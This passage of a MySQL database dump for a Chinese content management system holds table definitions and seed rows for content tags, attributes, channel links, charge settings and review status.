INSERT INTO `jc_contenttag` VALUES ('165', '81', '0');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '1');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '2');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '3');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '4');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '5');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '6');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '7');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '8');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '9');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '10');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '11');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '12');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '13');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '14');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '15');
INSERT INTO `jc_contenttag` VALUES ('165', '81', '16');
INSERT INTO `jc_contenttag` VALUES ('165', '86', '17');
INSERT INTO `jc_contenttag` VALUES ('165', '87', '18');
INSERT INTO `jc_contenttag` VALUES ('166', '88', '0');
INSERT INTO `jc_contenttag` VALUES ('166', '48', '1');
INSERT INTO `jc_contenttag` VALUES ('166', '58', '2');
INSERT INTO `jc_contenttag` VALUES ('166', '46', '3');
INSERT INTO `jc_contenttag` VALUES ('167', '32', '0');
INSERT INTO `jc_contenttag` VALUES ('167', '89', '1');
INSERT INTO `jc_contenttag` VALUES ('167', '89', '2');
INSERT INTO `jc_contenttag` VALUES ('167', '89', '3');
INSERT INTO `jc_contenttag` VALUES ('167', '90', '4');
INSERT INTO `jc_contenttag` VALUES ('167', '59', '5');
INSERT INTO `jc_contenttag` VALUES ('167', '60', '6');
INSERT INTO `jc_contenttag` VALUES ('167', '61', '7');
INSERT INTO `jc_contenttag` VALUES ('168', '48', '0');
INSERT INTO `jc_contenttag` VALUES ('168', '49', '1');
INSERT INTO `jc_contenttag` VALUES ('168', '49', '2');
INSERT INTO `jc_contenttag` VALUES ('168', '49', '3');
INSERT INTO `jc_contenttag` VALUES ('168', '48', '4');
INSERT INTO `jc_contenttag` VALUES ('168', '58', '5');
INSERT INTO `jc_contenttag` VALUES ('168', '31', '6');
INSERT INTO `jc_contenttag` VALUES ('168', '56', '7');
INSERT INTO `jc_contenttag` VALUES ('168', '57', '8');
INSERT INTO `jc_contenttag` VALUES ('168', '61', '9');
INSERT INTO `jc_contenttag` VALUES ('168', '31', '10');
INSERT INTO `jc_contenttag` VALUES ('168', '56', '11');
INSERT INTO `jc_contenttag` VALUES ('168', '57', '12');
INSERT INTO `jc_contenttag` VALUES ('168', '91', '13');
INSERT INTO `jc_contenttag` VALUES ('168', '79', '14');
INSERT INTO `jc_contenttag` VALUES ('168', '33', '15');
INSERT INTO `jc_contenttag` VALUES ('168', '92', '16');
INSERT INTO `jc_contenttag` VALUES ('169', '93', '0');
INSERT INTO `jc_contenttag` VALUES ('169', '58', '1');
INSERT INTO `jc_contenttag` VALUES ('169', '31', '2');
INSERT INTO `jc_contenttag` VALUES ('169', '56', '3');
INSERT INTO `jc_contenttag` VALUES ('169', '57', '4');
INSERT INTO `jc_contenttag` VALUES ('169', '94', '5');
INSERT INTO `jc_contenttag` VALUES ('169', '59', '6');
INSERT INTO `jc_contenttag` VALUES ('169', '59', '7');
INSERT INTO `jc_contenttag` VALUES ('169', '60', '8');
INSERT INTO `jc_contenttag` VALUES ('169', '61', '9');
INSERT INTO `jc_contenttag` VALUES ('169', '46', '10');
INSERT INTO `jc_contenttag` VALUES ('169', '79', '11');
INSERT INTO `jc_contenttag` VALUES ('169', '33', '12');
INSERT INTO `jc_contenttag` VALUES ('169', '92', '13');

-- ----------------------------
-- Table structure for jc_content_attachment
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_attachment`;
CREATE TABLE `jc_content_attachment` (
  `content_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL COMMENT '排列顺序',
  `attachment_path` varchar(255) NOT NULL COMMENT '附件路径',
  `attachment_name` varchar(100) NOT NULL COMMENT '附件名称',
  `filename` varchar(100) DEFAULT NULL COMMENT '文件名',
  `download_count` int(11) NOT NULL DEFAULT '0' COMMENT '下载次数',
  KEY `fk_jc_attachment_content` (`content_id`),
  CONSTRAINT `fk_jc_attachment_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容附件表';

-- ----------------------------
-- Records of jc_content_attachment
-- ----------------------------

-- ----------------------------
-- Table structure for jc_content_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_attr`;
CREATE TABLE `jc_content_attr` (
  `content_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_content` (`content_id`),
  CONSTRAINT `fk_jc_attr_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容扩展属性表';

-- ----------------------------
-- Records of jc_content_attr
-- ----------------------------
INSERT INTO `jc_content_attr` VALUES ('14', 'pic1', '');
INSERT INTO `jc_content_attr` VALUES ('14', 'pic2', '');
INSERT INTO `jc_content_attr` VALUES ('23', 'pic1', '');
INSERT INTO `jc_content_attr` VALUES ('23', 'pic2', '');
INSERT INTO `jc_content_attr` VALUES ('27', 'pic1', '');
INSERT INTO `jc_content_attr` VALUES ('27', 'pic2', '');
INSERT INTO `jc_content_attr` VALUES ('28', 'pic1', '');
INSERT INTO `jc_content_attr` VALUES ('28', 'pic2', '');
INSERT INTO `jc_content_attr` VALUES ('29', 'pic1', '');
INSERT INTO `jc_content_attr` VALUES ('29', 'pic2', '');
INSERT INTO `jc_content_attr` VALUES ('32', 'pic1', '');
INSERT INTO `jc_content_attr` VALUES ('32', 'pic2', '');
INSERT INTO `jc_content_attr` VALUES ('53', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('53', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('53', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('55', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('55', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('55', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('57', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('57', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('57', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('59', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('59', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('59', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('61', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('61', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('61', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('63', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('63', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('63', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('67', 'em', '经管营销');
INSERT INTO `jc_content_attr` VALUES ('68', 'hy', 'DOC');
INSERT INTO `jc_content_attr` VALUES ('68', 'em', '人文社科');
INSERT INTO `jc_content_attr` VALUES ('67', 'hy', 'DOC');
INSERT INTO `jc_content_attr` VALUES ('74', 'hy', 'PPT');
INSERT INTO `jc_content_attr` VALUES ('74', 'em', '教育');
INSERT INTO `jc_content_attr` VALUES ('114', 'pic1', '');
INSERT INTO `jc_content_attr` VALUES ('114', 'pic2', '');
INSERT INTO `jc_content_attr` VALUES ('114', 'pic3', '');
INSERT INTO `jc_content_attr` VALUES ('13', 'pic1', '');
INSERT INTO `jc_content_attr` VALUES ('13', 'pic2', '');
INSERT INTO `jc_content_attr` VALUES ('13', 'pic3', '');
INSERT INTO `jc_content_attr` VALUES ('7', 'pic1', '');
INSERT INTO `jc_content_attr` VALUES ('7', 'pic2', '');
INSERT INTO `jc_content_attr` VALUES ('7', 'pic3', '');
INSERT INTO `jc_content_attr` VALUES ('115', 'pic1', '');
INSERT INTO `jc_content_attr` VALUES ('115', 'pic2', '');
INSERT INTO `jc_content_attr` VALUES ('115', 'pic3', '');
INSERT INTO `jc_content_attr` VALUES ('121', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('121', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('121', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('122', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('122', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('122', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('123', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('123', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('123', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('124', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('124', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('124', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('125', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('125', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('125', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('126', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('126', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('126', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('127', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('127', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('127', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('128', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('128', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('128', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('129', 'Starring', '');
INSERT INTO `jc_content_attr` VALUES ('129', 'Video', '正片');
INSERT INTO `jc_content_attr` VALUES ('129', 'Director', '');
INSERT INTO `jc_content_attr` VALUES ('133', 'hy', 'DOC');
INSERT INTO `jc_content_attr` VALUES ('133', 'em', '教育');
INSERT INTO `jc_content_attr` VALUES ('134', 'hy', 'PDF');
INSERT INTO `jc_content_attr` VALUES ('134', 'em', '办公应用');
INSERT INTO `jc_content_attr` VALUES ('135', 'hy', 'DOC');
INSERT INTO `jc_content_attr` VALUES ('135', 'em', '人文社科');
INSERT INTO `jc_content_attr` VALUES ('136', 'hy', 'PDF');
INSERT INTO `jc_content_attr` VALUES ('136', 'em', '人文社科');
INSERT INTO `jc_content_attr` VALUES ('137', 'hy', 'PPT');
INSERT INTO `jc_content_attr` VALUES ('137', 'em', '科技');
INSERT INTO `jc_content_attr` VALUES ('138', 'hy', 'DOC');
INSERT INTO `jc_content_attr` VALUES ('138', 'em', '经管营销');
INSERT INTO `jc_content_attr` VALUES ('139', 'hy', 'PDF');
INSERT INTO `jc_content_attr` VALUES ('139', 'em', '教育');

-- ----------------------------
-- Table structure for jc_content_buy
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_buy`;
CREATE TABLE `jc_content_buy` (
  `content_buy_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `order_number` varchar(50) NOT NULL DEFAULT '' COMMENT '订单号',
  `content_id` int(11) NOT NULL COMMENT '内容ID',
  `buy_user_id` int(11) DEFAULT NULL COMMENT '购买用户ID',
  `author_user_id` int(11) NOT NULL COMMENT '笔者ID',
  `charge_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '成交金额',
  `author_amount` double(11,4) NOT NULL DEFAULT '0.0000' COMMENT '笔者所得',
  `plat_amount` double(11,4) NOT NULL DEFAULT '0.0000' COMMENT '平台所得',
  `buy_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '成交时间',
  `has_paid_author` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否已经结算给作者(0未结算 1已经结算)',
  `order_num_weixin` varchar(255) DEFAULT NULL COMMENT '微信支付订单号',
  `order_num_alipay` varchar(100) DEFAULT NULL COMMENT '支付宝订单号',
  `charge_reward` tinyint(1) NOT NULL DEFAULT '1' COMMENT '模式 1收费 2打赏',
  PRIMARY KEY (`content_buy_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='收费文章购买记录';

-- ----------------------------
-- Records of jc_content_buy
-- ----------------------------

-- ----------------------------
-- Table structure for jc_content_channel
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_channel`;
CREATE TABLE `jc_content_channel` (
  `channel_id` int(11) NOT NULL,
  `content_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`content_id`),
  KEY `fk_jc_channel_content` (`content_id`),
  CONSTRAINT `fk_jc_channel_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_content_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容栏目关联表';

-- ----------------------------
-- Records of jc_content_channel
-- ----------------------------
INSERT INTO `jc_content_channel` VALUES ('76', '2');
INSERT INTO `jc_content_channel` VALUES ('76', '7');
INSERT INTO `jc_content_channel` VALUES ('96', '11');
INSERT INTO `jc_content_channel` VALUES ('96', '12');
INSERT INTO `jc_content_channel` VALUES ('76', '13');
INSERT INTO `jc_content_channel` VALUES ('96', '14');
INSERT INTO `jc_content_channel` VALUES ('96', '23');
INSERT INTO `jc_content_channel` VALUES ('96', '27');
INSERT INTO `jc_content_channel` VALUES ('96', '28');
INSERT INTO `jc_content_channel` VALUES ('96', '29');
INSERT INTO `jc_content_channel` VALUES ('96', '30');
INSERT INTO `jc_content_channel` VALUES ('96', '32');
INSERT INTO `jc_content_channel` VALUES ('96', '33');
INSERT INTO `jc_content_channel` VALUES ('96', '36');
INSERT INTO `jc_content_channel` VALUES ('96', '37');
INSERT INTO `jc_content_channel` VALUES ('96', '39');
INSERT INTO `jc_content_channel` VALUES ('77', '53');
INSERT INTO `jc_content_channel` VALUES ('77', '55');
INSERT INTO `jc_content_channel` VALUES ('77', '57');
INSERT INTO `jc_content_channel` VALUES ('77', '59');
INSERT INTO `jc_content_channel` VALUES ('77', '61');
INSERT INTO `jc_content_channel` VALUES ('77', '63');
INSERT INTO `jc_content_channel` VALUES ('81', '67');
INSERT INTO `jc_content_channel` VALUES ('81', '68');
INSERT INTO `jc_content_channel` VALUES ('81', '74');
INSERT INTO `jc_content_channel` VALUES ('96', '111');
INSERT INTO `jc_content_channel` VALUES ('96', '112');
INSERT INTO `jc_content_channel` VALUES ('96', '113');
INSERT INTO `jc_content_channel` VALUES ('76', '114');
INSERT INTO `jc_content_channel` VALUES ('76', '115');
INSERT INTO `jc_content_channel` VALUES ('76', '116');
INSERT INTO `jc_content_channel` VALUES ('76', '117');
INSERT INTO `jc_content_channel` VALUES ('76', '118');
INSERT INTO `jc_content_channel` VALUES ('76', '119');
INSERT INTO `jc_content_channel` VALUES ('76', '120');
INSERT INTO `jc_content_channel` VALUES ('77', '121');
INSERT INTO `jc_content_channel` VALUES ('77', '122');
INSERT INTO `jc_content_channel` VALUES ('77', '123');
INSERT INTO `jc_content_channel` VALUES ('77', '124');
INSERT INTO `jc_content_channel` VALUES ('77', '125');
INSERT INTO `jc_content_channel` VALUES ('77', '126');
INSERT INTO `jc_content_channel` VALUES ('77', '127');
INSERT INTO `jc_content_channel` VALUES ('77', '128');
INSERT INTO `jc_content_channel` VALUES ('77', '129');
INSERT INTO `jc_content_channel` VALUES ('96', '130');
INSERT INTO `jc_content_channel` VALUES ('96', '131');
INSERT INTO `jc_content_channel` VALUES ('96', '132');
INSERT INTO `jc_content_channel` VALUES ('81', '133');
INSERT INTO `jc_content_channel` VALUES ('81', '134');
INSERT INTO `jc_content_channel` VALUES ('81', '135');
INSERT INTO `jc_content_channel` VALUES ('81', '136');
INSERT INTO `jc_content_channel` VALUES ('81', '137');
INSERT INTO `jc_content_channel` VALUES ('81', '138');
INSERT INTO `jc_content_channel` VALUES ('81', '139');
INSERT INTO `jc_content_channel` VALUES ('76', '141');
INSERT INTO `jc_content_channel` VALUES ('94', '142');
INSERT INTO `jc_content_channel` VALUES ('94', '143');
INSERT INTO `jc_content_channel` VALUES ('94', '144');
INSERT INTO `jc_content_channel` VALUES ('94', '145');
INSERT INTO `jc_content_channel` VALUES ('94', '146');
INSERT INTO `jc_content_channel` VALUES ('94', '147');
INSERT INTO `jc_content_channel` VALUES ('94', '148');
INSERT INTO `jc_content_channel` VALUES ('94', '149');
INSERT INTO `jc_content_channel` VALUES ('94', '150');
INSERT INTO `jc_content_channel` VALUES ('94', '151');
INSERT INTO `jc_content_channel` VALUES ('94', '152');
INSERT INTO `jc_content_channel` VALUES ('94', '153');
INSERT INTO `jc_content_channel` VALUES ('94', '154');
INSERT INTO `jc_content_channel` VALUES ('94', '155');
INSERT INTO `jc_content_channel` VALUES ('94', '156');
INSERT INTO `jc_content_channel` VALUES ('94', '157');
INSERT INTO `jc_content_channel` VALUES ('95', '158');
INSERT INTO `jc_content_channel` VALUES ('95', '159');
INSERT INTO `jc_content_channel` VALUES ('95', '160');
INSERT INTO `jc_content_channel` VALUES ('95', '161');
INSERT INTO `jc_content_channel` VALUES ('95', '162');
INSERT INTO `jc_content_channel` VALUES ('95', '163');
INSERT INTO `jc_content_channel` VALUES ('95', '164');
INSERT INTO `jc_content_channel` VALUES ('95', '165');
INSERT INTO `jc_content_channel` VALUES ('95', '166');
INSERT INTO `jc_content_channel` VALUES ('95', '167');
INSERT INTO `jc_content_channel` VALUES ('95', '168');
INSERT INTO `jc_content_channel` VALUES ('95', '169');

-- ----------------------------
-- Table structure for jc_content_charge
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_charge`;
CREATE TABLE `jc_content_charge` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `charge_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '收费金额',
  `total_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '已累计收费',
  `year_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '年金额',
  `month_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '月金额',
  `day_amount` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '日金额',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '最后购买时间',
  `charge_reward` tinyint(1) NOT NULL DEFAULT '0' COMMENT '模式，1收费 2打赏',
  `reward_random_min` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '随机 最小值',
  `reward_random_max` double(11,2) NOT NULL DEFAULT '0.00' COMMENT '随机 最大值',
  `reward_pattern` tinyint(1) NOT NULL DEFAULT '0' COMMENT '打赏模式(0随机 1固定)',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='收费内容配置';

-- ----------------------------
-- Records of jc_content_charge
-- ----------------------------
INSERT INTO `jc_content_charge` VALUES ('130', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('142', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('143', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('144', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('145', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('146', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('147', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('148', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('149', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('150', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('151', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('152', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('153', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('154', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('155', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('156', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('157', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('158', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('159', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('160', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('161', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('162', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('163', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('164', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('165', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('166', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('167', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('168', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');
INSERT INTO `jc_content_charge` VALUES ('169', '0.00', '0.00', '0.00', '0.00', '0.00', null, '0', '0.01', '1.00', '0');

-- ----------------------------
-- Table structure for jc_content_check
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_check`;
CREATE TABLE `jc_content_check` (
  `content_id` int(11) NOT NULL,
  `check_step` tinyint(4) NOT NULL DEFAULT '0' COMMENT '审核步数',
  `check_opinion` varchar(255) DEFAULT NULL COMMENT '审核意见',
  `is_rejected` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否退回',
  `reviewer` int(11) DEFAULT NULL COMMENT '终审者',
  `check_date` datetime DEFAULT NULL COMMENT '终审时间',
  PRIMARY KEY (`content_id`),
  KEY `fk_jc_content_check_user` (`reviewer`),
  CONSTRAINT `fk_jc_check_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_content_check_user` FOREIGN KEY (`reviewer`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容审核信息表';

-- ----------------------------
-- Records of jc_content_check
-- ----------------------------
INSERT INTO `jc_content_check` VALUES ('2', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('7', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('11', '-1', null, '0', '1', '2016-09-28 14:17:39');
INSERT INTO `jc_content_check` VALUES ('12', '-1', null, '0', '1', '2016-09-28 14:17:39');
INSERT INTO `jc_content_check` VALUES ('13', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('14', '-1', null, '0', '1', '2016-09-28 14:17:39');
INSERT INTO `jc_content_check` VALUES ('23', '-1', null, '0', '1', '2016-09-28 14:17:39');
INSERT INTO `jc_content_check` VALUES ('27', '-1', null, '0', '1', '2016-09-28 14:17:38');
INSERT INTO `jc_content_check` VALUES ('28', '-1', null, '0', '1', '2016-09-28 14:17:38');
INSERT INTO `jc_content_check` VALUES ('29', '-1', null, '0', '1', '2016-09-28 14:17:38');
INSERT INTO `jc_content_check` VALUES ('30', '-1', null, '0', '1', '2016-09-28 14:17:38');
INSERT INTO `jc_content_check` VALUES ('32', '-1', null, '0', '1', '2016-09-28 14:17:37');
INSERT INTO `jc_content_check` VALUES ('33', '-1', null, '0', '1', '2016-09-28 14:17:37');
INSERT INTO `jc_content_check` VALUES ('36', '-1', null, '0', '1', '2016-09-28 14:17:37');
INSERT INTO `jc_content_check` VALUES ('37', '-1', null, '0', '1', '2016-09-28 14:17:37');
INSERT INTO `jc_content_check` VALUES ('39', '-1', null, '0', '1', '2016-09-28 14:17:37');
INSERT INTO `jc_content_check` VALUES ('53', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('55', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('57', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('59', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('61', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('63', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('67', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('68', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('74', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('111', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('112', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('113', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('114', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('115', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('116', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('117', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('118', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('119', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('120', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('121', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('122', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('123', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('124', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('125', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('126', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('127', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('128', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('129', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('130', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('131', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('132', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('133', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('134', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('135', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('136', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('137', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('138', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('139', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('141', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('142', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('143', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('144', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('145', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('146', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('147', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('148', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('149', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('150', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('151', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('152', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('153', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('154', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('155', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('156', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('157', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('158', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('159', '3', null, '0', null, null);
